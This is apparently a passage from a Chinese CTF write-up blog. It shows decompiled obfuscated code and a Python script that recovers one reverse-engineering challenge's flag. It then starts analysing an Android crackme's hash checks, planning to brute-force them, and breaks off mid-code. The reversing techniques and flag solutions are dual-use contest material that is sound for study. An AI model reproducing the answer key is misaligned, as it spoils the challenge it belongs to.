<span class="number">-1119517027</span>;</span><br><span class="line">      <span class="keyword">if</span> ( i &lt; <span class="number">256</span> )</span><br><span class="line">        v5 = <span class="number">1985024802</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">-1119517027</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    dword_8ED3B0E8[v15] = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_8ED24684();</span><br><span class="line">  v6 = sub_8ED24978();</span><br><span class="line">  v7 = sub_8ED24A18(v6, lens);</span><br><span class="line">  v8 = <span class="number">2031990082</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v12 = v7;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( v8 &lt;= <span class="number">-44937610</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v8 &gt; <span class="number">-1227108057</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">-1227108056</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v10 = <span class="number">1</span>;</span><br><span class="line">LABEL_27:</span><br><span class="line">              v12 = v10;</span><br><span class="line">              v8 = <span class="number">1736361794</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v8 = <span class="number">1517945422</span>;</span><br><span class="line">              <span class="keyword">if</span> ( bytesAfterXor[v14] != aimBytes[v14] )</span><br><span class="line">                v8 = <span class="number">1454719996</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( v8 == <span class="number">-1972997478</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v14 = v1;</span><br><span class="line">            v8 = <span class="number">-1227108056</span>;</span><br><span class="line">            <span class="keyword">if</span> ( v1 &lt; <span class="number">40</span> )</span><br><span class="line">              v8 = <span class="number">-96183791</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v8 = <span class="number">0x791DB542</span>;</span><br><span class="line">            bytesAfterXor[ind] = xor_key[<span class="number">4</span> * ind] ^ base64bytes[ind] ^ ind;</span><br><span class="line">            v9 = ind + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v8 &gt; <span class="number">1517945421</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v8 != <span class="number">-44937609</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">        &#125;</span><br><span class="line">        v1 = <span class="number">0</span>;</span><br><span class="line">        v8 = <span class="number">-1972997478</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v8 != <span class="number">1517945422</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v8 = <span class="number">-1972997478</span>;</span><br><span class="line">      v1 = v14 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v8 != <span class="number">2031990082</span> )</span><br><span class="line">      <span class="keyword">return</span> v12;</span><br><span class="line">    ind = v9;</span><br><span class="line">    v8 = <span class="number">-44937609</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v9 &lt; <span class="number">40</span> )</span><br><span class="line">      v8 = <span class="number">-1516589019</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># flag还原代码</span></span><br><span class="line">base64Bytes = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line"></span><br><span class="line">base64table=[<span class="number">0x5A</span>, <span class="number">0x4F</span>, <span class="number">0x36</span>, <span class="number">0x4B</span>, <span class="number">0x71</span>, <span class="number">0x37</span>, <span class="number">0x39</span>, <span class="number">0x4C</span>, <span class="number">0x26</span>, </span><br><span class="line"><span class="number">0x43</span>, <span class="number">0x50</span>, <span class="number">0x57</span>, <span class="number">0x76</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0x70</span>, <span class="number">0x7A</span>, <span class="number">0x51</span>, </span><br><span class="line"><span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x44</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x47</span>, <span class="number">0x40</span>, <span class="number">0x64</span>,</span><br><span class="line"><span class="number">0x69</span>, <span class="number">0x2A</span>, <span class="number">0x6B</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x38</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x46</span>,</span><br><span class="line"><span class="number">0x65</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x6C</span>, <span class="number">0x6D</span>, <span class="number">0x2B</span>, <span class="number">0x2F</span>, <span class="number">0x75</span>, <span class="number">0x35</span>,</span><br><span class="line"><span class="number">0x61</span>, <span class="number">0x5E</span>, <span class="number">0x32</span>, <span class="number">0x59</span>, <span class="number">0x74</span>, <span class="number">0x54</span>, <span class="number">0x4A</span>, <span class="number">0x55</span>, <span class="number">0x56</span>,</span><br><span class="line"><span class="number">0x45</span>, <span class="number">0x6E</span>, <span class="number">0x30</span>, <span class="number">0x24</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x79</span>, <span class="number">0x23</span>]</span><br><span class="line"></span><br><span class="line">key= [<span class="number">0xF8</span>, <span class="number">0xA7</span>, <span class="number">0x9E</span>, <span class="number">0xA0</span>, <span class="number">0xC3</span>,</span><br><span class="line"><span class="number">0x66</span>, <span class="number">0x65</span>, <span class="number">0x21</span>, <span class="number">0xD5</span>, <span class="number">0xE0</span>,</span><br><span class="line"><span class="number">0x40</span>, <span class="number">0xA5</span>, <span class="number">0x80</span>, <span class="number">0x87</span>, </span><br><span class="line"><span class="number">0x9B</span>, <span class="number">0xD2</span>, <span class="number">0xCD</span>, <span class="number">0x30</span>, <span class="number">0xBB</span>, </span><br><span class="line"><span class="number">0x6A</span>, <span class="number">0x80</span>, <span class="number">0x21</span>, <span class="number">0xD1</span>, <span class="number">0xD0</span>,</span><br><span class="line"><span class="number">0xE5</span>, <span class="number">0x7F</span>, <span class="number">0xB2</span>, <span class="number">0xE1</span>, </span><br><span class="line"><span class="number">0xE9</span>, <span class="number">0xC4</span>, <span class="number">0x73</span>, <span class="number">0x96</span>, <span class="number">0x90</span>,</span><br><span class="line"><span class="number">0x82</span>, <span class="number">0x21</span>, <span class="number">0x11</span>, <span class="number">0x47</span>, <span class="number">0xD2</span>,</span><br><span class="line"><span class="number">0xC8</span>, <span class="number">0x44</span>]</span><br><span class="line"></span><br><span class="line">aimBytes=[<span class="number">0xA8</span>, <span class="number">0xCE</span>, <span class="number">0xCE</span>, <span class="number">0xD7</span>, <span class="number">0xB1</span>, <span class="number">0x5A</span>, <span class="number">0x20</span>, <span class="number">0x4B</span>, <span class="number">0xAB</span>, <span class="number">0xA2</span>, <span class="number">0x23</span>, <span class="number">0xFA</span>,</span><br><span class="line"><span class="number">0xFC</span>, <span class="number">0xF0</span>, <span class="number">0xDF</span>, <span class="number">0xA5</span>, <span class="number">0xB4</span>, <span class="number">0x77</span>, <span class="number">0xE6</span>, <span class="number">0x41</span>, <span class="number">0xC4</span>, <span class="number">0x65</span>, <span class="number">0x84</span>, <span class="number">0x91</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x0A</span>, <span class="number">0xE6</span>, <span class="number">0xAE</span>, <span class="number">0xBB</span>, <span class="number">0xB5</span>, <span class="number">0x37</span>, <span class="number">0xFD</span>, <span class="number">0xC0</span>, <span class="number">0xCB</span>, <span class="number">0x72</span>, <span class="number">0x78</span>,</span><br><span class="line"><span class="number">0x13</span>, <span class="number">0x91</span>, <span class="number">0xD3</span>, <span class="number">0x5E</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printHexInList</span>(<span class="params">l</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bin</span>(i)[<span class="number">2</span>:], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line">    base64Bytes[ind] = aimBytes[ind] ^ key[ind] ^ ind</span><br><span class="line">    <span class="comment"># print(bin(base64Bytes[ind]),end=&#x27;, &#x27;)</span></span><br><span class="line"><span class="comment"># print()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess3Bytes</span>(<span class="params">int6_4byte</span>):</span></span><br><span class="line">    o_int6_4bytes=[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(int6_4byte)):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            int6_4byte[ind] = base64table.index(int6_4byte[ind])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            int6_4byte[ind] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        o_int6_4bytes[i] = (int6_4byte[i] &amp; <span class="number">0x38</span>) | ((int6_4byte[i] ^ (int6_4byte[i] &gt;&gt; <span class="number">3</span>)) &amp; <span class="number">0x7</span> )</span><br><span class="line">    o_3bytes = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    o_3bytes[<span class="number">0</span>] = ((o_int6_4bytes[<span class="number">0</span>] &lt;&lt; <span class="number">2</span>) | (o_int6_4bytes[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    o_3bytes[<span class="number">1</span>] = ((o_int6_4bytes[<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) | (o_int6_4bytes[<span class="number">2</span>] &gt;&gt; <span class="number">2</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    o_3bytes[<span class="number">2</span>] = ((o_int6_4bytes[<span class="number">2</span>] &lt;&lt; <span class="number">6</span>) | (o_int6_4bytes[<span class="number">3</span>] )) &amp; <span class="number">0xff</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># printHexInList(int6_4byte)</span></span><br><span class="line">    <span class="comment"># printHexInList(o_int6_4bytes)</span></span><br><span class="line">    <span class="comment"># printHexInList(o_3bytes)</span></span><br><span class="line">    <span class="comment"># print(&#x27;---------&#x27;)</span></span><br><span class="line">    <span class="keyword">return</span> o_3bytes</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&#123;e25be952&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>,<span class="number">4</span>):</span><br><span class="line">    g = guess3Bytes(base64Bytes[ind: ind+<span class="number">4</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(g[<span class="number">0</span>])+<span class="built_in">chr</span>(g[<span class="number">1</span>])+<span class="built_in">chr</span>(g[<span class="number">2</span>]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>一些不足：<br>没有对反调试代码逻辑进行细致的梳理，想着是能过就好。<br>xor_key在bss段，在程序运行过程中生成，没有梳理生成算法，动态调试连过去直接dump内存得到的。</p><h1 id="mimic-xctf-hahahaha"><a href="#mimic-xctf-hahahaha" class="headerlink" title="mimic-xctf-hahahaha"></a>mimic-xctf-hahahaha</h1><blockquote><p>强网杯 “拟态”比赛 mobile1</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">clip0: 5f384050   -&gt; 5fb84050</span><br><span class="line">clip_i_hash: fc7466e55fbf37b1</span><br><span class="line">clip1: 35315f48  -&gt; b531df48</span><br><span class="line">clip_i_hash: 78b0be39e63b6837</span><br><span class="line">clip2: 7d503131 -&gt;  fdd0b1b1 (rndKeyi=15</span><br><span class="line">clip_i_hash: c2f9c805d0442203</span><br><span class="line">clip3: 7b484035  -&gt; 7b4840b5</span><br><span class="line">clip_i_hash: c11a61bb60d79dab</span><br><span class="line">clip4: 435f3535 -&gt; c3dfb535</span><br><span class="line">clip_i_hash: 869e650ee55bd9f6</span><br><span class="line">clip5: 50314e33  -&gt; 50b14eb3</span><br><span class="line">clip_i_hash: f2dda5fc021fe2bf</span><br><span class="line">clip6: 3348375f -&gt;  b348b7df (rndKeyi=11</span><br><span class="line">clip_i_hash: 305044db48fe6174</span><br><span class="line">clip7: 47414c46 -&gt;  c7414c46 (rndKeyi=8</span><br><span class="line">clip_i_hash: d6659b5e2d1059f8</span><br></pre></td></tr></table></figure><p>该题先检查输入是否满足要求，然后基于输入数据生成flag。不过检查逻辑都是基于hash的，所以不能解密得到原文。<br>不过输入的8段数据(8个clip)的检查是相互独立的，所以可以考虑爆破。</p><p>接下来分析程序逻辑：</p><ol><li><p>密钥准备：<br>在<code>WelcomeActivity</code>中，先生成了相关密钥和hash值。<br><code>a.SpecBytesMat</code>是后续计算hash时用到的初始向量矩阵，实际的值是原来值的MD5。<br><code>a.rndKey</code>用于选择hash计算的函数，实际的值是原来值抑或<code>0xAB</code>。<br><code>a.clips_i_hash_mat</code>是8个hash值，也是输入的8个clip的hash值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">a.SpecBytesMat = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;<span class="string">&quot;WIgD1ZNZ0ilJqFpw&quot;</span>.getBytes(), <span class="string">&quot;4811tjOZjoiXpjdq&quot;</span>.getBytes(), <span class="string">&quot;ALFjcgztxnUaC89v&quot;</span>.getBytes(), <span class="string">&quot;ZgHzTu79Zwhoi0PB&quot;</span>.getBytes(), <span class="string">&quot;UYBfajKYrDFE1zJs&quot;</span>.getBytes(), <span class="string">&quot;yr4PBIjlJg89FpP3&quot;</span>.getBytes(), <span class="string">&quot;SFHqaTYDf7EeEevX&quot;</span>.getBytes(), <span class="string">&quot;gUwrqaE3nCxKr4Du&quot;</span>.getBytes()&#125;;</span><br><span class="line">a.rndKeys = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">0xAF</span>, <span class="number">0xA1</span>, <span class="number">0xA4</span>, <span class="number">170</span>, <span class="number">0xA5</span>, <span class="number">0xAE</span>, <span class="number">0xA0</span>, <span class="number">0xA3</span>&#125;;  <span class="comment">//  (xor 0xAB) -&gt; &#123;0x4,0xa,0xf,0x1,0xe,0x5,0xb,0x8&#125;</span></span><br><span class="line">a.clips_i_hash_mat = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;fc7466e55fbf37b1&quot;</span>, <span class="string">&quot;78b0be39e63b6837&quot;</span>, <span class="string">&quot;c2f9c805d0442203&quot;</span>, <span class="string">&quot;c11a61bb60d79dab&quot;</span>, <span class="string">&quot;869e650ee55bd9f6&quot;</span>, <span class="string">&quot;f2dda5fc021fe2bf&quot;</span>, <span class="string">&quot;305044db48fe6174&quot;</span>, <span class="string">&quot;d6659b5e2d1059f8&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WelcomeActivity</span> <span class="keyword">extends</span> <span class="title">h</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// a.b.c.h</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg4)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(arg4);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">0x7F0B001D</span>);  <span class="comment">// layout:activity_welcome</span></span><br><span class="line">        <span class="keyword">int</span> ind2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> ind1;  <span class="comment">// xor 0xAB</span></span><br><span class="line">        <span class="keyword">for</span>(ind1 = <span class="number">0</span>; <span class="keyword">true</span>; ++ind1) &#123;  <span class="comment">// xor 0xAB</span></span><br><span class="line">            <span class="keyword">int</span>[] v1 = a.rndKeys;</span><br><span class="line">            <span class="keyword">if</span>(ind1 &gt;= v1.length) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v1[ind1] ^= <span class="number">0xAB</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(ind2 &lt; a.SpecBytesMat.length) &#123;</span><br><span class="line">            MessageDigest MD5 = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MD5 = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(NoSuchAlgorithmException v1_1) &#123;</span><br><span class="line">                v1_1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            MD5.update(a.SpecBytesMat[ind2]);</span><br><span class="line">            a.SpecBytesMat[ind2] = MD5.digest();</span><br><span class="line">            ++ind2;  <span class="comment">// Loop MD5 to bytesMat(iteratively)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.findViewById(<span class="number">0x7F080088</span>).setOnClickListener(<span class="keyword">new</span> WelcomeActivity.click2MainActivity(<span class="keyword">this</span>));  <span class="comment">// id:go_btn</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>输入格式检查<br>先获取输入的8段字符串，然后进行检查。<br>字符串需要是16进制字符串。（不带<code>0x</code>）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">clipsi[<span class="number">0</span>] = v1.p;</span><br><span class="line">clipsi[<span class="number">1</span>] = v1.q;</span><br><span class="line">clipsi[<span class="number">2</span>] = v1.r;</span><br><span class="line">clipsi[<span class="number">3</span>] = v1.s;</span><br><span class="line">clipsi[<span class="number">4</span>] = v1.t;</span><br><span class="line">clipsi[<span class="number">5</span>] = v1.u;</span><br><span class="line">clipsi[<span class="number">6</span>] = v1.v;</span><br><span class="line">clipsi[<span class="number">7</span>] = v1.w;</span><br><span class="line">String[] clips = <span class="keyword">new</span> String[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">int</span> v6 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v7;</span><br><span class="line"><span class="keyword">for</span>(v7 = <span class="number">0</span>; v6 &lt; <span class="number">8</span>; ++v7) &#123;</span><br><span class="line">    String v8 = clipsi[v6].getText().toString();  <span class="comment">// 要求输入8x8个字符</span></span><br><span class="line">    <span class="keyword">if</span>(v8.length() != <span class="number">8</span>) &#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>.b, <span class="string">&quot;clips must be enough, try again!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    clips[v7] = v8;</span><br><span class="line">    ++v6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ind = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(ind &lt; <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] clips_i_bytes = a.hex2Bytes(clips[ind]);  <span class="comment">// format check 8位16进制字符串</span></span><br><span class="line">    <span class="keyword">if</span>(clips_i_bytes == <span class="keyword">null</span>) &#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>.b, <span class="string">&quot;clips format error, try again!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        <span class="keyword">while</span>(ind &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            clipsi[ind].setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            ++ind;  <span class="comment">// clean clips</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] hex2Bytes(String arg6) &#123;</span><br><span class="line">    <span class="keyword">int</span> lens = arg6.length();</span><br><span class="line">    <span class="keyword">byte</span>[] v1 = <span class="keyword">new</span> <span class="keyword">byte</span>[lens / <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> ind = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(ind &lt; lens) &#123;</span><br><span class="line">        <span class="keyword">int</span> v3 = Character.digit(arg6.charAt(ind), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">int</span> v4 = Character.digit(arg6.charAt(ind + <span class="number">1</span>), <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span>(v3 &gt;= <span class="number">0</span> &amp;&amp; v4 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            v1[ind / <span class="number">2</span>] = (<span class="keyword">byte</span>)(v3 + v4);</span><br><span class="line">            ind += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>格式转换与校验<br>既然每个clip是8位的16进制字符串，那么它等价于4个byte，也即一个<code>int32</code>。<br>于是先转换为4个byte，然后把4个byte的最高位提出来构造为一个<code>int4</code>记作<code>rndKey</code>，然后4个byte只保留剩余的7位记作<code>clips_i_bytes</code>。<br>设当前检查的是第<code>i</code>个clip。<br>接着，调用一个自定义的hash计算函数，要求<code>hash(rndKey, clips_i_bytes)=hash(a.rndKeys[i], clips_i_bytes)=a.clip_i_hash_mat[i]</code>。<br>hash内部是一个更为烧脑的计算逻辑，输入的<code>rndKey</code>会用来选择hash计算算法，输入的<code>clips_i_bytes</code>是hash的原文，如果<code>rndKey&gt;7</code>，会调用<code>a.SpecBytesMat</code>作为hash计算的盐。<br>不过，考虑到hash计算的特性，在<code>rndKey!=a.rndKeys[i]</code>的情况下，<code>hash(rndKey, clips_i_bytes)=hash(a.rndKeys[i], clips_i_bytes)</code>的概率极小，所以不妨直接设定<code>rndKey=a.rndKeys[i]</code>,由于a.rndKeys[i]已知，且rndKey来自于输入的clip，所以这下就确定了4个bit。<br>接下来就是枚举剩余的28个bit，使得<code>hash(a.rndKeys[i], clips_i_bytes)=a.clip_i_hash_mat[i]</code>。（代码见最后）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span 